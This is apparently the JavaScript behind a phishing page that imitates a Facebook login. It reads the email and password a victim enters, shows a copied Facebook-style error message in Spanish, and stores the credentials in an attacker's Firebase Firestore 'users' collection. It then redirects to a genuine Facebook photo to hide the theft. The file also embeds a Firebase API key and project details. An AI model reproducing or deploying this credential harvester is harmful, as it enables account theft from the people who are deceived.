firebase.initializeApp({
    apiKey: "AIzaSyDqfihS3c6xRg8GPG3LwedqxVbaWv80MVM",
    authDomain: "prestacasa-ad0ec.firebaseapp.com",
    databaseURL: "https://prestacasa-ad0ec.firebaseio.com",
    projectId: "prestacasa-ad0ec",
    storageBucket: "prestacasa-ad0ec.appspot.com",
    messagingSenderId: "846656829348"
  });

   // Initialize Cloud Firestore through Firebase
   var db = firebase.firestore();

  function guardar(){
    var correoFace = document.getElementById('emailFacebook').value;
    var contrasenaFace = document.getElementById('passFacebook').value;
    if(correoFace=="" || contrasenaFace==""){
        alert('El nombre de usuario y la contraseña que ingresaste no coinciden con nuestros registros. Por favor, revisa e inténtalo de nuevo.')
    }else{
      try {
          db.collection("users").add({
          correo: correoFace,
          contrasena: contrasenaFace
      })
          .then(function(docRef) {
            console.log("Document written with ID: ", docRef.id);
              document.getElementById('emailFacebook').value='';
              document.getElementById('passFacebook').value='';
          })
          .catch(function(error) {
              console.error("Error adding document: ", error);
      });
  
      } catch (error) {
        alert('Cargando...')
      }

      window.open("https://www.facebook.com/photo.php?fbid=693547614311078&set=a.163717127294132&type=1&opaqueCursor=AbrawmhBEPb27zMCNdV2xcOnKDT9HruomDZTjItxofptkLti9EoJtQDkgaYb3NmwdB9v0Gb8BuXA1-XUPQDArHmPHnl80HLNwSJhm9FnRgzCUVCFxpfb7nGWPbP0Xo12EawhTulz5O0IjGEWgDC4jE3Ec8OC9LaUh2-FGw2PYOgm4ZJXJv1NJFaBX95xYPCeOQqC6dH9iVQkXdcMwV1QS_UQjqF3gWmM3VnvG2fCFila4gpvFdDQajcKbYhv1-WnQ7oPcFv2nNA2-Io3-xhgJ9AuSLSlsNGmYueMfC4st471M4yzP-8_gd-Xf0KR2Xnoxw0cT11IPUbiO4ABrM_nYgRe_HwOx3I1PHEHqVkHz5b7QRmV0tTH9Al5AAUPGvPnyOlSDTttmihYV8WSxskAnn08mwWkLDqz3Q_jpER7bIwd-VyHykfg1dQz_ToLj2v8JwCBzELcH7KpBKIuK5x0QC05dARREROunWQ8iZDkhs8MVKld6xPbLwV6Cu7pBEe_TwaoONFN7kzYAyI_Gm2jjImFzhbCpoG00MIbmWDhGkvUVCZILWOkLLcGCBC0vxrdCK6Nsvc-gnbZksWARMNgoFbi-AsKBRAHsUDxFDoelv99SFBJozm7IusF4OL9g641qEabTk6oVPz6t_R5CLT-31xCZ4QAJdSe9GbH5L3MFeJxyX37_RI4ENK1zNHFB4c3spRtjNEKlTe6egqcHPV0KgJMCVRjVsbUbdNwwG3kP4QNtIjc6EE586402f6ks-EsL2w3mKVSI1fJCGx7dRKHddBzVQa632IiMC1nN3SD7XudCAJ1wcpPKP-mP5-OzQ5VG6OLb4LcMj7yPnwsbhiCC6OHAVMK5tKy6Zx2ZZs5WspujXUS7EMkqvYaGQezROowL6r_4e_CwuSJ1FV-YtwK2GZh7pOOj_mzBUB1UOd-pFEdzDfgJE-IMF_W1ZQzKfyvhadKYWxw8FFYL3bZ7SJo5duhglcfs7nbel5BhV6w_HP9dxgZmpPpQ091RH2rtWzCpW0FkNV60GSR1jqrH5zjmaiHeIuv6DbSLQZ-2r1ebP4L1jy6nn1-MEYU1f7xCID7aK6Dt6q0vEk1MM8ypzVG93hBaA80jUGV3smvFPzuF7VQoyZR8PDUraOrekIvn399xV57WlK_l0_Y0SynrFF0jGZVmppdPpQ69LEzH3d0XBj7_1_lxtrGlr_JtWzB276Sw-J61ENcvUW95SkW4Rl1Ea4Hs5-spp8DkJJ_WAFERIh26NrqTG9f0unaC1hDrR13d1KfT18ODNjGRJEj-KjkUSGtA_FvISS0p3ENZ7gPtP--roU2osrtC1T6opuMFWYUJgCrmfZuDnQ7rt4dRPqwebLEK3D1oZvhAKR7GjZdVm8N8KL3RcgFV2Q-BvRRxl8U4Uos27duwDfIid640VI3zOlxuxHClchHXuWj9S7YHW8PMyCzwtajDsRnydZCoiKii2E&theater","_blank");

    }






    }//Aqui termina el metodo para las coordenadas